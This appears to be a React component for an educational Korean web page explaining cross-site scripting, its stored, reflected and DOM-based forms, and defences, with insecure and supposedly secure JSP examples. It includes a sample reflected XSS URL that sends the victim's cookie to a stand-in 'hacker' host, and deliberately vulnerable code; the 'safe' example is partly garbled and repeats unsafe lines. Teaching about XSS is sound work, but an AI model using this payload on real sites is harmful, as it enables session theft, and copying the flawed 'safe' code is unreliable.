import React, { Component } from 'react';
import Header from '../components/header.js'
import './learn.css';
import { BrowserRouter as Router, Route, Link, Switch, Redirect } from 'react-router-dom';
import axios from 'axios';
import image1 from '../assets/xss_image1.png'
import image2 from '../assets/xss_image2.png'
import image3 from '../assets/xss_image3.png'
import image4 from '../assets/xss_image4.png'
import image5 from '../assets/xss_image5.png'

class Learn_10 extends Component {

    state = {
        check: 0
    };

    move = (e) => {
        document.location.href = "/learn_10_"
    }

    render() {

        return (
            <div>
                <Header />
                <div className="connection-wrap">
                    <div className="learn_">
                        <h1>크로스 사이트 스크립팅</h1>
                        <b><h3>취약점 개념 설명</h3></b>
                        <br></br>
                        XSS(Cross-Site Scripting) 이란 웹 애플리케이션에서 일어나는 취약점으로 관리자가 아닌 권한이 없는 사용자가 웹 사이트에 스크립트를 삽입하는 공격 기법이다.
                        웹에 관한 취약점 중에서 빈도가 많이 발생하고, 보안상 위협을 크게 줄 수 있는 것들을 선정한 OWASP(The Open Web Application Security Project) Top 10에 속해있는 공격이다. <br></br>
                        대부분 사용자가 글을 쓰고 읽을 수 있는 게시판에서 많이 발생하지만, 사용자의 입력 값을 웹 페이지에 보여주는 곳에서도 발생한다. 악의적인 사용자가 C&C 서버로 리다이렉션 하기 위해 리다이렉션 스크립트를 주입하여 중간 경유지로 활용하기도 하고, 사용자의 쿠키를 탈취하여 세션 하이재킹(Session Hijacking) 공격을 수행하기도 한다.
                        <br></br><br></br>
                        <img className="image" src={image1}></img><br></br>
                        위 그림은 XSS 공격 중 Persistent(or Stored) XSS Attack 이고, 사용자의 세션을 탈취하는 프로세스를 나타내고 있다. 해커가 XSS 공격에 취약한 웹사이트에 악의적인 스크립트를 삽입하고, 그 스크립트가 있는 게시글을 열람한 사용자는 악성스크립트로 인해 본인의 쿠키가 해커에게 전송된다. 세션ID가 포함된 쿠키를 탈취한 해커는 탈취한 사용자의 계정으로 로그인 할 수 있다.
                        <br></br>
                        <br></br>
                        <b><h3>공격 종류 및 방법</h3></b><br></br>
                        <div>
                            <b>- Persistent(or Stored) XSS - 지속형(혹은 저장형) XSS 공격</b><br></br>
                            XSS 공격 종류 중 하나인 Persistent XSS 는 말 그대로 지속적으로 피해를 입히는 XSS 공격이다.<br></br>
                            <img className="image" src={image2}></img><br></br>
                            위의 그림을 보면, 해커는 웹 애플리케이션에서 XSS 취약점이 있는 곳을 파악하고, 악성스크립트를 삽입한다. 삽입된 스크립트는 데이터베이스에 저장이 되고, 저장된 악성스크립트가 있는 게시글 등을 열람한 사용자들은 악성스크립트가 작동하면서 쿠키를 탈취당한다던가, 혹은 다른 사이트로 리다이렉션 되는 공격을 받게 된다. 데이터베이스에 저장이 되어 지속적으로 공격한다고 하여 Persistent XSS 라고 부르며, 데이터베이스에 저장이 되므로 Stored XSS 공격이라고 부르기도 한다. 한번의 공격으로 악성스크립트를 삽입하여 수많은 피해를 입힐 수 있다는 점이 특징이다.
Persistent XSS로 가장 많이 공격이 되는 곳은 게시판이며, 굳이 게시판이 아니더라도 사용자가 입력한 값이 데이터베이스에 저장이 되고, 저장된 값이 그대로 프론트엔드 단에 보여주는 곳에 공격이 성공할 가능성이 크다. XSS공격도 SQL Injection과 같이 사용자의 입력에 대한 검증이 없기 때문에 발생한다.

                        </div>
                        <br></br>

                        <div>
                            <b>- Reflected XSS(반사형 XSS 공격)</b><br></br>
                            Reflected XSS 공격은 사용자에게 입력 받은 값을 서버에서 되돌려 주는 곳에서 발생한다. <br></br>
                            <img className="image" src={image3}></img><br></br>
                            예를 들어 사용자에게 입력 받은 검색어를 그대로 보여주는 곳이나 사용자가 입력한 값을 에러 메세지에 포함하여 보여주는 곳에 악성스크립트가 삽입되면, 서버가 사용자의 입력 값을 포함해 응답해 줄 때 스크립트가 실행된다.  보통 Reflected XSS 는 공격자가 악의적인 스크립트와 함께 URL을 사용자에게 누르도록 유도하고, URL을 누른 사용자는 악의적인 스크립트가 실행되면서 공격을 당하게 된다.
예를 들면, GET 방식으로 검색기능을 구현한 웹 애플리케이션에 XSS 취약점이 있음을 확인한 해커는 공격코드를 작성한다. <br></br><br></br>
                        http://testweb?search=&lt;script&gt;location.href("http://hacker/cookie.php?value="+document.cookie);&lt;/script&gt;
                        <br></br>
                        악의적인 스크립트를 살펴보면 검색 인자로 작성한 스크립트를 넘겨 줌을 알 수 있다. 해당 스크립트의 내용은 본인의 웹페이지로 URL을 클릭한 사용자의 쿠키 값이 전송되도록 되어 있으며, 링크를 클릭한 사용자는 해커한테 본인의 의도와는 상관없이 자신의 쿠키 값을 전송하게 된다.
                        </div>
                        <br></br>
                        <div>
                            <b>- DOM based XSS - DOM(Document Object Model) 기반 XSS 공격</b><br></br>
                            DOM based XSS 는 악의적인 스크립트가 포함 된 URL을 사용자가 요청하게 되어 브라우저를 해석하는 단계에 발생하는 공격이다. 악의적인 스크립트로 인해서 클라이언트 측 코드가 원래 의도와는 다르게 실행된다. DOM based XSS 공격은 다른 XSS 공격과는 다르게 서버 측에서 탐지가 어렵다는 특징을 가지고 있다.
                            <br></br>
                            <img className="image" src={image4}></img><br></br>
                            위의 그림을 보면 해커는 http://www.some.site/page.html URL 과 함께 # 이라는 특수문자를 사용하고 있는데, 이 특수문자는 # 이후의 값은 서버로 전송되지 않는 기능을 가지고 있다.
                            <br></br>
                            <img className="learn_image_big" src={image5}></img><br></br>
                            위 사진은 DOM based XSS 공격 위치를 나타내고 있다.
                            <br></br><br></br>
                            사용자의 요청에 따라 HTML을 다르게 해석하는 부분에 공격 가능하다.

                        </div>
                        <br></br>

                        <br></br>
                        <b><h3>대응방안</h3></b><br></br>
                        <div>
                            <b>입출력 값 검증</b><br></br>
                        사용자가 입력한 값에 대한 검증과 사용자가 입력한 값을 그대로 출력할 때 검증이 필요하다. XSS Cheat Sheet 에 대한 필터 목록을 만들어 모든 Cheat Sheet에 대한 대응이 가능하도록 하여야 하며, XSS에 대한 필터링을 적용한 뒤 직접 테스트 하여 스크립트가 실행되는지 모의해킹 해보는 것도 좋은 방법이다.
                        <br></br><br></br>
                            <b>XSS 방어 라이브러리 , 브라우저 확장앱 사용</b><br></br>
                        XSS를 막아주는 Anti XSS 라이브러리를 여러 회사에서 제공하는데 이 라이브러리를 사용하면 손쉽게 XSS를 방어할 수 있다. XSS 라이브러리를 사용하는 것은 서버 단에서 개발자가 추가하는 것이고, 사용자들이 각자 본인의 브라우저에서 악의적인 스크립트가 실행되지 않도록 방어하는 것이 중요하다. 방문하는 모든 사이트가 안전하다는 보장이 없기 때문에 브라우저 확장 앱 중 Anti XSS 를 해주는 애플리케이션을 설치하고 방어하여야 한다.
                        <br></br><br></br>
                            <b>웹 방화벽 사용</b><br></br>
                        웹 방화벽은 웹 공격에 특화되어있기 때문에 XSS 공격을 방어하기 위함만이 아니라 각종 Injection 공격을 효과적으로 방어할 수 있다.
                        </div>
                        <br></br><br></br>

                        <b><h3>코드 예제</h3></b><br></br>
                        <div>
                            <b>안전하지 않은 코드의 예1 JAVA</b><br></br>
                            <div>

                                &lt;% String keyword = request.getParameter("keyword"); %&gt;<br></br>
                                // 외부 입력값에 대하여 검증 없이 화면에 출력될 경우 공격스크립트가 포함된 URL을 생성 할 수 있어 안전하지 않다.(Reflected XSS)<br></br>
                                검색어 : &lt;%=keyword%&gt;


                            </div>

                            <br></br>
                            <b>안전하지 않은 코드의 예2 JAVA</b><br></br>
                            <div>

                                // 게시판 등의 입력form을 통해 외부값이 DB에 저장되고, 이를 검증 없이 화면에 출력될 경우 공격스크립트가 실행되어 안전하지 않다.(Stored XSS)<br></br>
                            검색결과 : $&#x7b;m.content&#x7d;<br></br>
                            &lt;script type=“text/javascript”&gt;<br></br>
                            // 외부 입력값에 대하여 검증 없이 브라우저에서 실행되는 경우 서버를 거치지 않는 공격스크립트가 포함된 URL을 생성 할 수 있어 안전하지 않다. (DOM 기반 XSS)<br></br>
                            document.write(“keyword:” + &lt;%=keyword%&gt;);
                            &lt;/script&gt;<br></br>
                            </div>
                            <br></br>
                            외부 입력값 파라미터나 게시판등의 form에 의해 서버의 처리 결과를 사용자 화면에 출력하는 경우, 입력값에 대해서 문자열 치환 함수를 이용하여 스크립트 문자열을 제거하거나, JSTL을 이용하여 출력하거나, 잘 만들어진 외부 XSS 방지 라이브러리를 활용하는 것이 안전하다.
크로스사이트 스크립트의 경우 동작 상황에 따라 동일한 조치방법을 사용하면, 크로스사이트 스크립트 방지는 되더라도 원하는 동작이 정상적으로 되지 않을 수 있기 때문에, 잘 만들어진 외부 XSS방지 라이브러리를 이용하여 각 동작 상황에 따라 적절하게 사용하는 것을 권장한다.

                        <br></br><br></br>
                            <b>안전한 코드의 예 JAVA</b><br></br>
                            <div>


                                &lt;% String keyword = request.getParameter("keyword"); %&gt;<br></br>
// 방법1. 입력값에 대하여 스크립트 공격가능성이 있는 문자열을 치환한다.<br></br>
keyword = keyword.replaceAll("&#x26;", "{"&amp;"}"); <br></br>
keyword = keyword.replaceAll("&lt;", "{"&lt;"}"); <br></br>
keyword = keyword.replaceAll("&gt;", "{"&gt;"}"); <br></br>
keyword = keyword.replaceAll("\"", "{"&quot;"}"); <br></br>
keyword = keyword.replaceAll("'", "{"&#x27;"}"); <br></br>
keyword = keyword.replaceAll("/"", "{"&#x2F;"}"); <br></br>
keyword = keyword.replaceAll("(", "{"&#x28;"}"); <br></br>
keyword = keyword.replaceAll(")", "{"&#x29;"}"); <br></br>
검색어 : &lt;%=keyword%&gt;<br></br>
                                <br></br>
// 방법2. JSP에서 출력값에 JSTL c:out 을 사용하여 처리한다.<br></br>
&lt;%@ taglib prefix="c" uri="http://java.sun.com/jsp/jstl/core"%&gt;<br></br>
&lt;%@ taglib uri="http://java.sun.com/jsp/jstl/functions" prefix="fn" %&gt;<br></br>
검색결과 : $&#x7b;m.content&#x7d;<br></br>
&lt;script type="text/javascript"&gt;<br></br>
                                <br></br>

 // 방법3. 잘 만들어진 외부 라이브러리를 활용(NAVER Lucy-XSS-Filter, OWASP ESAPI, OWASP Java-Encoder-Project)<br></br>
document.write("keyword:“ + &lt;%=Encoder.encodeForJS(Encoder.encodeForHTML(keyword))%&gt;);<br></br>
&lt;/script&gt;<br></br>


                            // 게시판 등의 입력form을 통해 외부값이 DB에 저장되고, 이를 검증 없이 화면에 출력될 경우 공격스크립트가 실행되어 안전하지 않다.(Stored XSS)<br></br>
                            검색결과 : $&#x7b;m.content&#x7d;<br></br>
                            &lt;script type=“text/javascript”&gt;<br></br>
                            // 외부 입력값에 대하여 검증 없이 브라우저에서 실행되는 경우 서버를 거치지 않는 공격스크립트가 포함된 URL을 생성 할 수 있어 안전하지 않다. (DOM 기반 XSS)<br></br>
                            document.write(“keyword:” + &lt;%=keyword%&gt;);<br></br>
                            &lt;/script&gt;<br></br>
                            </div>
                        </div>
                        <br></br>
                        <br></br>
                        <hr></hr>


                        <button className="problem_button" onClick={this.move}>미니문제 풀러 가기</button>
                    </div>

                </div>

            </div >
        )
    }
}

export default Learn_10;